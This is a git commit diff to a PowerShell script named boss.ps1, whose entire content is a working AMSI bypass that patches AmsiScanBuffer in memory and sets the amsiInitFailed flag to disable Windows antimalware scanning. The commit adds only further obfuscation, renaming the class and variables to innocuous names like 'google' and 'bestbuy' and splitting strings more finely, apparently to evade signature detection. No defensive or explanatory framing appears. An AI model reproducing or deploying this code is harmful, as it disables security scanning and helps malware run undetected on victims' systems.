b04d556bdfae84ff97e1a2fe37ec1706b7567b24
hoagie195 <63024165+hoagie195@users.noreply.github.com>
2022-06-21 21:56:41 -0500

    test3

--- boss.ps1
+++ boss.ps1
@@ -1,4 +1,4 @@
-$Win32 = @"
+$google = @"
 using System;
 using System.Runtime.InteropServices;
 public class Win32 {
@@ -10,11 +10,11 @@ public class Win32 {
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 }
 "@
-Add-Type $Win32
-$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
-$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
+Add-Type $google
+$LoadLibrary = [google]::LoadLibrary("a" + "m" + "si.dll")
+$bestbuy = [google]::GetProcAddress($LoadLibrary, "A" + "msi" + "Sc" + "an" + "B" + "uffer")
 $p = 0
-[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
-$Patch = [Byte[]] (0x12+0xA6, 0x25+0x32, 0x00, 0x02+0x05, 0x80, 0xE+0xB5)
-[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+[google]::VirtualProtect($bestbuy, [uint32]5, 0x40, [ref]$p)
+$confluence = [Byte[]] (0x12+0xA6, 0x25+0x32, 0x00, 0x02+0x05, 0x80, 0xE+0xB5)
+[System.Runtime.InteropServices.Marshal]::Copy($confluence, 0, $bestbuy, 6)
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
